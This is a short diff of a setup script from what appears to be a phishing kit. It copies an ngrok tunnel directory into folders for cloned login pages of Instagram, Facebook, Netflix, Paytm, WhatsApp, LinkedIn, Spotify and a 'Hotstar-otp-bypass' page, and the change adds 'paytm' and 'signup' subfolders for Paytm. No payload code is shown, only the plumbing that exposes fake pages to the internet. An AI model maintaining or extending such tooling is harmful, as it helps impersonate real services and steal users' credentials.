@@ -11,7 +11,8 @@ cp -R ngrok sites/Hotstar-otp-bypass/
 cp -R ngrok sites/instagram/
 cp -R ngrok sites/Linkedin/
 cp -R ngrok sites/Netflix/
-cp -R ngrok sites/Paytm-Phishing/
+cp -R ngrok sites/Paytm-Phishing/paytm/
+cp -R ngrok sites/Paytm-Phishing/signup/
 cp -R ngrok sites/spotify/
 cp -R ngrok sites/whatsapp-phishing/
 cp -R ngrok sites/facebook/
